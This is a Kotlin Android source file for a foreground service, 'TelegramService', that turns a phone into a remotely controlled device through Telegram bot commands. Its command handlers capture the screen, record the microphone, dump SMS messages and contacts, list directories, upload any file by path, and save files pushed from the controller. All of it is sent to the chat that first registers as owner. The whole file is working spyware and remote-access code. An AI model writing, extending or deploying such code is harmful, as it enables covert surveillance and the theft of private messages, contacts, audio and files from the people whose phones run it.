package com.company.product

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.ContactsContract
import kotlinx.coroutines.*
import java.io.ByteArrayInputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class TelegramService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var deviceManager: DeviceManager
    private var pollingJob: Job? = null
    private var audioRecorder: MediaRecorder? = null
    private var audioFile: File? = null

    override fun onCreate() {
        super.onCreate()
        deviceManager = DeviceManager.getInstance(this)
        createNotificationChannel()
        UiLogger.log("SRV", "Service created, deviceId=${deviceManager.deviceId}")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("TG Bot · ${deviceManager.deviceId}")
            .setContentText("En ecoute...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
        startPolling()
        UiLogger.log("SRV", "Foreground service started")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        UiLogger.log("SRV", "Service stopping...")
        pollingJob?.cancel()
        scope.cancel()
        stopRecording()
        super.onDestroy()
    }

    private fun startPolling() {
        pollingJob?.cancel()
        pollingJob = scope.launch {
            deviceManager.lastUpdateId = deviceManager.lastUpdateId
            UiLogger.log("POLL", "Polling started, offset=${deviceManager.lastUpdateId}")

            while (isActive) {
                try {
                    val updates = withContext(Dispatchers.IO) {
                        TelegramBot.getUpdates(deviceManager.lastUpdateId)
                    }
                    if (updates.isNotEmpty()) {
                        UiLogger.log("POLL", "Received ${updates.size} update(s)")
                    }
                    for (update in updates) {
                        processUpdate(update)
                        deviceManager.lastUpdateId = update.updateId + 1
                    }
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    UiLogger.log("POLL", "Poll error: ${e.message}")
                    delay(5_000)
                }
            }
        }
    }

    private suspend fun processUpdate(update: TelegramBot.Update) {
        val msg = update.message
        val cb = update.callbackQuery
        val doc = update.document
        val photo = update.photo

        if (cb != null) {
            handleCallback(cb)
            return
        }

        val chatId = msg?.chatId ?: return

        if (deviceManager.ownerChatId == 0L && chatId > 0) {
            deviceManager.ownerChatId = chatId
            UiLogger.log("AUTH", "Owner registered: chatId=$chatId")
        }
        if (chatId != deviceManager.ownerChatId) {
            UiLogger.log("AUTH", "Ignored message from non-owner chatId=$chatId")
            return
        }

        if (doc != null) {
            handleIncomingFile(chatId, doc)
            return
        }
        if (photo != null) {
            handleIncomingFile(chatId, photo)
            return
        }

        val text = msg?.text?.trim() ?: return
        if (text.isEmpty()) return

        UiLogger.log("MSG", "[$chatId] $text")
        handleCommand(chatId, text)
    }

    private fun handleCallback(cb: TelegramBot.CallbackQuery) {
        val data = cb.data ?: ""
        UiLogger.log("CB", "data=$data")
        when {
            data.startsWith("select:") -> {
                val target = data.removePrefix("select:")
                if (target == deviceManager.deviceId) {
                    deviceManager.isActive = true
                    TelegramBot.answerCallbackQuery(cb.id, "Appareil actif")
                    TelegramBot.editMessageReplyMarkup(cb.chatId, cb.messageId, null)
                    TelegramBot.sendMessage(cb.chatId, "Appareil actif : ${deviceManager.deviceId}")
                    UiLogger.log("CB", "Device ACTIVATED: ${deviceManager.deviceId}")
                } else {
                    deviceManager.isActive = false
                    TelegramBot.answerCallbackQuery(cb.id, "Appareil change")
                    TelegramBot.editMessageReplyMarkup(cb.chatId, cb.messageId, null)
                    UiLogger.log("CB", "Device deactivated")
                }
            }
        }
    }

    private suspend fun handleCommand(chatId: Long, text: String) {
        when {
            text == "/start" -> {
                deviceManager.ownerChatId = chatId
                TelegramBot.sendMessage(chatId, "Appareil enregistre : ${deviceManager.deviceId}\n\n/help pour la liste des commandes")
                UiLogger.log("CMD", "/start — registered")
            }

            text == "/devices" -> {
                val activeTag = if (deviceManager.isActive) " (actif)" else ""
                val keyboard = org.json.JSONObject().apply {
                    put("inline_keyboard", org.json.JSONArray().apply {
                        put(org.json.JSONArray().apply {
                            put(org.json.JSONObject().apply {
                                put("text", "Selectionner ${deviceManager.deviceId}")
                                put("callback_data", "select:${deviceManager.deviceId}")
                            })
                        })
                    })
                }
                TelegramBot.sendMessage(
                    chatId,
                    "Appareil : ${deviceManager.deviceId}$activeTag\nAndroid ${Build.VERSION.RELEASE} | ${Build.MANUFACTURER} ${Build.MODEL}",
                    keyboard
                )
            }

            text == "/ping" && deviceManager.isActive -> {
                TelegramBot.sendMessage(chatId, "Pong depuis ${deviceManager.deviceId}")
                UiLogger.log("CMD", "/ping — responded")
            }

            text == "/info" && deviceManager.isActive -> {
                val info = buildString {
                    appendLine("ID : ${deviceManager.deviceId}")
                    appendLine("Modele : ${Build.MODEL}")
                    appendLine("Fabricant : ${Build.MANUFACTURER}")
                    appendLine("Android : ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
                }
                TelegramBot.sendMessage(chatId, info)
                UiLogger.log("CMD", "/info — sent")
            }

            text == "/help" -> {
                val help = buildString {
                    appendLine("*Commandes disponibles :*")
                    appendLine()
                    appendLine("/start — Enregistrer l'appareil")
                    appendLine("/devices — Lister les appareils")
                    appendLine("/ping — Verifier la connexion")
                    appendLine("/info — Infos de l'appareil")
                    appendLine("/screen — Capture d'ecran")
                    appendLine("/record \\[secondes] — Enregistrer audio (defaut 10s)")
                    appendLine("/sms — Dump des SMS")
                    appendLine("/contacts — Dump des contacts")
                    appendLine("/file \\<chemin> — Upload un fichier")
                    appendLine("/ls \\[chemin] — Lister un repertoire")
                    appendLine("/help — Cette aide")
                    appendLine()
                    appendLine("Envoie un fichier/photo pour le sauvegarder sur l'appareil.")
                }
                TelegramBot.sendMessage(chatId, help)
            }

            text == "/screen" -> {
                if (!deviceManager.isActive) {
                    TelegramBot.sendMessage(chatId, "Aucun appareil selectionne. Tape /devices.")
                    return
                }
                doScreenshot(chatId)
            }

            text.startsWith("/record") -> {
                if (!deviceManager.isActive) {
                    TelegramBot.sendMessage(chatId, "Aucun appareil selectionne. Tape /devices.")
                    return
                }
                doRecord(chatId, text)
            }

            text == "/sms" -> {
                if (!deviceManager.isActive) {
                    TelegramBot.sendMessage(chatId, "Aucun appareil selectionne. Tape /devices.")
                    return
                }
                doDumpSms(chatId)
            }

            text == "/contacts" -> {
                if (!deviceManager.isActive) {
                    TelegramBot.sendMessage(chatId, "Aucun appareil selectionne. Tape /devices.")
                    return
                }
                doDumpContacts(chatId)
            }

            text.startsWith("/file") -> {
                if (!deviceManager.isActive) {
                    TelegramBot.sendMessage(chatId, "Aucun appareil selectionne. Tape /devices.")
                    return
                }
                doUploadFile(chatId, text)
            }

            text.startsWith("/ls") -> {
                if (!deviceManager.isActive) {
                    TelegramBot.sendMessage(chatId, "Aucun appareil selectionne. Tape /devices.")
                    return
                }
                doListDir(chatId, text)
            }

            text == "/ping" && !deviceManager.isActive -> {
                // silently ignored
            }

            text.startsWith("/") && !deviceManager.isActive -> {
                TelegramBot.sendMessage(chatId, "Aucun appareil selectionne. Tape /devices.")
            }

            else -> {
                // non-command text, ignored
            }
        }
    }

    private suspend fun doScreenshot(chatId: Long) {
        UiLogger.log("CMD", "SCREENSHOT starting...")
        if (ScreenCaptureManager.resultCode == 0 || ScreenCaptureManager.data == null) {
            TelegramBot.sendMessage(chatId, "Erreur: Capture d'ecran non configuree. Rouvre l'app et accepte la capture.")
            UiLogger.log("CMD", "SCREENSHOT: No MediaProjection available")
            return
        }

        val file = captureScreen()
        if (file != null) {
            UiLogger.log("CMD", "SCREENSHOT: file=${file.absolutePath} size=${file.length()}")
            TelegramBot.sendMessage(chatId, "Capture d'ecran en cours d'envoi...")
            val ok = TelegramBot.sendPhoto(chatId, file)
            if (ok) {
                UiLogger.log("CMD", "SCREENSHOT sent OK")
            } else {
                TelegramBot.sendMessage(chatId, "Echec de l'envoi")
                UiLogger.log("CMD", "SCREENSHOT: send failed")
            }
            file.delete()
        } else {
            TelegramBot.sendMessage(chatId, "Echec de la capture d'ecran")
            UiLogger.log("CMD", "SCREENSHOT: capture returned null")
        }
    }

    private suspend fun captureScreen(): File? = withContext(Dispatchers.Main) {
        try {
            val data = ScreenCaptureManager.data ?: return@withContext null
            val resultCode = ScreenCaptureManager.resultCode

            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = mgr.getMediaProjection(resultCode, data)
            val metrics = resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            val latch = CountDownLatch(1)
            var bitmap: Bitmap? = null

            val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            reader.setOnImageAvailableListener({ r ->
                try {
                    r.acquireLatestImage()?.let { image ->
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * width
                        bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride, height,
                            Bitmap.Config.ARGB_8888
                        )
                        bitmap!!.copyPixelsFromBuffer(buffer)
                        image.close()
                    }
                } finally {
                    latch.countDown()
                }
            }, null)

            val vd = projection.createVirtualDisplay(
                "screenshot", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, null
            )

            latch.await(3, TimeUnit.SECONDS)
            vd.release()
            reader.close()
            projection.stop()

            bitmap?.let { bmp ->
                withContext(Dispatchers.IO) {
                    val file = File(cacheDir, "scr_${System.currentTimeMillis()}.png")
                    FileOutputStream(file).use { fos ->
                        bmp.compress(Bitmap.CompressFormat.PNG, 80, fos)
                    }
                    bmp.recycle()
                    file
                }
            }
        } catch (e: Exception) {
            UiLogger.log("SCR", "captureScreen: ${e.message}")
            null
        }
    }

    private suspend fun doRecord(chatId: Long, text: String) {
        val parts = text.split(" ", limit = 2)
        val seconds = parts.getOrNull(1)?.toIntOrNull() ?: 10
        val capped = seconds.coerceIn(1, 120)
        UiLogger.log("CMD", "RECORD: ${capped}s")

        TelegramBot.sendMessage(chatId, "Enregistrement audio ${capped}s...")

        try {
            val file = withContext(Dispatchers.IO) {
                startRecording()
            }
            if (file == null) {
                TelegramBot.sendMessage(chatId, "Echec du demarrage de l'enregistrement")
                return
            }
            UiLogger.log("AUDIO", "Recording started -> ${file.name}")

            delay(capped * 1000L)

            val recorded = withContext(Dispatchers.IO) { stopRecording() }
            if (recorded != null && recorded.exists() && recorded.length() > 0) {
                UiLogger.log("AUDIO", "Recording done, size=${recorded.length()}")
                val ok = TelegramBot.sendAudio(chatId, recorded)
                if (ok) {
                    UiLogger.log("AUDIO", "Audio sent")
                } else {
                    TelegramBot.sendMessage(chatId, "Echec de l'envoi audio")
                }
                recorded.delete()
            } else {
                TelegramBot.sendMessage(chatId, "Aucun audio enregistre")
            }
        } catch (e: Exception) {
            UiLogger.log("AUDIO", "Record error: ${e.message}")
            TelegramBot.sendMessage(chatId, "Erreur: ${e.message}")
        }
    }

    private fun startRecording(): File? {
        return try {
            val file = File(cacheDir, "rec_${System.currentTimeMillis()}.m4a")
            audioFile = file
            audioRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            file
        } catch (e: Exception) {
            UiLogger.log("AUDIO", "startRecording: ${e.message}")
            null
        }
    }

    private fun stopRecording(): File? {
        return try {
            audioRecorder?.apply {
                stop()
                release()
            }
            audioRecorder = null
            audioFile
        } catch (e: Exception) {
            UiLogger.log("AUDIO", "stopRecording: ${e.message}")
            null
        }
    }

    private suspend fun doDumpSms(chatId: Long) = withContext(Dispatchers.IO) {
        UiLogger.log("CMD", "SMS dump starting...")
        try {
            val sb = StringBuilder()
            val uri = Uri.parse("content://sms")
            contentResolver.query(uri, null, null, null, "date DESC")?.use { cursor ->
                val addrIdx = cursor.getColumnIndex("address")
                val bodyIdx = cursor.getColumnIndex("body")
                val dateIdx = cursor.getColumnIndex("date")
                val typeIdx = cursor.getColumnIndex("type")
                var count = 0
                while (cursor.moveToNext() && count < 500) {
                    val addr = cursor.getString(addrIdx) ?: "?"
                    val body = cursor.getString(bodyIdx) ?: ""
                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
                        .format(Date(cursor.getLong(dateIdx)))
                    val type = if (cursor.getInt(typeIdx) == 1) "IN" else "OUT"
                    sb.appendLine("[$date] $type $addr: $body")
                    count++
                }
                UiLogger.log("SMS", "Dumped $count messages")
            }

            if (sb.isEmpty()) {
                TelegramBot.sendMessage(chatId, "Aucun SMS trouve")
                return@withContext
            }

            val file = File(cacheDir, "sms_dump_${System.currentTimeMillis()}.txt")
            file.writeText(sb.toString())
            UiLogger.log("SMS", "File: ${file.absolutePath} (${file.length()} bytes)")

            val ok = TelegramBot.sendDocument(chatId, file)
            if (ok) {
                UiLogger.log("SMS", "SMS dump sent")
            } else {
                if (sb.length > 4000) {
                    TelegramBot.sendMessage(chatId, "SMS dump trop volumineux (${sb.length} chars)")
                } else {
                    TelegramBot.sendMessage(chatId, sb.toString())
                }
            }
            file.delete()
        } catch (e: Exception) {
            UiLogger.log("SMS", "Error: ${e.message}")
            TelegramBot.sendMessage(chatId, "Erreur SMS: ${e.message}")
        }
    }

    private suspend fun doDumpContacts(chatId: Long) = withContext(Dispatchers.IO) {
        UiLogger.log("CMD", "CONTACTS dump starting...")
        try {
            val sb = StringBuilder()
            contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                val hasPhoneIdx = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
                var count = 0
                while (cursor.moveToNext()) {
                    val name = cursor.getString(nameIdx) ?: "?"
                    val id = cursor.getString(idIdx)
                    val hasPhone = cursor.getInt(hasPhoneIdx) > 0
                    val phones = mutableListOf<String>()

                    if (hasPhone) {
                        contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id), null
                        )?.use { pCursor ->
                            val numIdx = pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            while (pCursor.moveToNext()) {
                                phones.add(pCursor.getString(numIdx) ?: "")
                            }
                        }
                    }
                    sb.appendLine("$name: ${phones.joinToString(", ").ifEmpty { "(aucun)" }}")
                    count++
                }
                UiLogger.log("CONTACTS", "Dumped $count contacts")
            }

            if (sb.isEmpty()) {
                TelegramBot.sendMessage(chatId, "Aucun contact trouve")
                return@withContext
            }

            val file = File(cacheDir, "contacts_${System.currentTimeMillis()}.txt")
            file.writeText(sb.toString())

            val ok = TelegramBot.sendDocument(chatId, file, "Contacts dump")
            if (ok) {
                UiLogger.log("CONTACTS", "Sent ${sb.length} chars")
            } else {
                TelegramBot.sendMessage(chatId, "Echec de l'envoi (${sb.length} chars)")
            }
            file.delete()
        } catch (e: Exception) {
            UiLogger.log("CONTACTS", "Error: ${e.message}")
            TelegramBot.sendMessage(chatId, "Erreur contacts: ${e.message}")
        }
    }

    private suspend fun doUploadFile(chatId: Long, text: String) = withContext(Dispatchers.IO) {
        val path = text.removePrefix("/file").trim()
        if (path.isEmpty()) {
            TelegramBot.sendMessage(chatId, "Usage: /file <chemin>\nEx: /file /sdcard/Download/test.pdf")
            return@withContext
        }

        UiLogger.log("FILE", "Upload requested: $path")
        val file = File(path)
        if (!file.exists()) {
            TelegramBot.sendMessage(chatId, "Fichier introuvable: $path")
            UiLogger.log("FILE", "NOT FOUND: $path")
            return@withContext
        }
        if (file.isDirectory) {
            TelegramBot.sendMessage(chatId, "C'est un repertoire, pas un fichier")
            return@withContext
        }
        if (file.length() > 50 * 1024 * 1024) {
            TelegramBot.sendMessage(chatId, "Fichier trop volumineux: ${file.length() / 1024 / 1024} MB (max 50 MB)")
            return@withContext
        }

        UiLogger.log("FILE", "Uploading: ${file.name} (${file.length()} bytes)")
        val ok = TelegramBot.sendDocument(chatId, file, file.name)
        if (ok) {
            UiLogger.log("FILE", "Upload OK")
        } else {
            TelegramBot.sendMessage(chatId, "Echec de l'upload")
            UiLogger.log("FILE", "Upload FAILED")
        }
    }

    private suspend fun doListDir(chatId: Long, text: String) = withContext(Dispatchers.IO) {
        val pathArg = text.removePrefix("/ls").trim()
        val dir = if (pathArg.isEmpty()) {
            Environment.getExternalStorageDirectory()
        } else {
            File(pathArg)
        }

        UiLogger.log("LS", "List: ${dir.absolutePath}")
        if (!dir.exists() || !dir.isDirectory) {
            TelegramBot.sendMessage(chatId, "Repertoire invalide: ${dir.absolutePath}")
            return@withContext
        }

        val files = dir.listFiles()?.toList()?.sortedBy { it.name } ?: emptyList()
        val parts = mutableListOf<String>()
        val header = "=== ${dir.absolutePath} ===\n${files.size} elements\n"
        var current = StringBuilder(header)

        for (f in files) {
            val prefix = if (f.isDirectory) "[DIR]" else "[FILE]"
            val size = if (f.isFile) " ${formatSize(f.length())}" else ""
            val line = "$prefix ${f.name}$size\n"
            if (current.length + line.length > 4000) {
                parts.add(current.toString())
                current = StringBuilder()
            }
            current.append(line)
        }
        if (current.isNotEmpty()) parts.add(current.toString())

        parts.forEachIndexed { i, p ->
            TelegramBot.sendMessage(chatId, p)
        }
        UiLogger.log("LS", "Sent ${parts.size} message(s)")
    }

    private suspend fun handleIncomingFile(chatId: Long, fileInfo: TelegramBot.FileInfo) = withContext(Dispatchers.IO) {
        UiLogger.log("DL", "Incoming: ${fileInfo.fileName ?: "?"} (${fileInfo.fileId.take(20)}...)")
        TelegramBot.sendMessage(chatId, "Telechargement en cours: ${fileInfo.fileName ?: "fichier"}...")

        val filePath = TelegramBot.getFilePath(fileInfo.fileId)
        if (filePath == null) {
            TelegramBot.sendMessage(chatId, "Impossible d'obtenir le chemin du fichier")
            UiLogger.log("DL", "getFilePath failed")
            return@withContext
        }

        val data = TelegramBot.downloadFile(filePath)
        if (data == null) {
            TelegramBot.sendMessage(chatId, "Echec du telechargement")
            UiLogger.log("DL", "downloadFile failed")
            return@withContext
        }

        val dlDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "TgBot")
        if (!dlDir.exists()) dlDir.mkdirs()

        val name = fileInfo.fileName ?: "file_${System.currentTimeMillis()}"
        var dest = File(dlDir, name)
        var counter = 1
        while (dest.exists()) {
            val dot = name.lastIndexOf('.')
            dest = if (dot > 0) {
                File(dlDir, "${name.substring(0, dot)}_$counter${name.substring(dot)}")
            } else {
                File(dlDir, "${name}_$counter")
            }
            counter++
        }

        dest.writeBytes(data)
        UiLogger.log("DL", "Saved: ${dest.absolutePath} (${data.size} bytes)")
        TelegramBot.sendMessage(chatId, "Sauvegarde: ${dest.absolutePath}\nTaille: ${formatSize(data.size.toLong())}")
    }

    private fun formatSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024 * 1024 * 1024 -> "${bytes / (1024 * 1024)} MB"
            else -> "${bytes / (1024 * 1024 * 1024)} GB"
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Telegram Bot",
                NotificationManager.IMPORTANCE_LOW
            ).apply { description = "Service de connexion Telegram" }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    companion object {
        private const val CHANNEL_ID = "telegram_bot"
        private const val NOTIFICATION_ID = 420
    }
}
